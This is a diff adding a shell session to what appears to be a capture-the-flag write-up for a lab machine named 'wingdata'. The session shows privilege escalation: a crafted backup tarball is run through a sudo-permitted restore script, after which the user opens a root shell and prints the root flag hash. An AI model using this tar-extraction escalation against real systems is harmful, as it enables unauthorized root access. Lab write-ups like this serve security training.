@@ -1171,6 +1171,29 @@ with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:
 </div>
 
 #### 5.2.2 
+
+```shell
+wacky@wingdata:~$ vi backup_1338.py
+wacky@wingdata:~$ python3 backup_1338.py 
+wacky@wingdata:~$ ls
+backup_1338.py  backup_9999.tar  pwn  user.txt
+wacky@wingdata:~$ cp backup_9999.tar /opt/backup_clients/backups/
+wacky@wingdata:~$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_evil
+[+] Backup: backup_9999.tar
+[+] Staging directory: /opt/backup_clients/restored_backups/restore_evil
+[+] Extraction completed in /opt/backup_clients/restored_backups/restore_evil
+wacky@wingdata:~$ sudo su - -c "/bin/bash
+> ls
+> ^C^C
+wacky@wingdata:~$ sudo su - -c "/bin/bash"
+
+root@wingdata:~# ls
+root.txt
+root@wingdata:~# cat root.txt 
+f2a52d70be65e0aa9d219e4ac344c598
+root@wingdata:~# 
+
+```
 <div align="center">
 <br>
 <br>
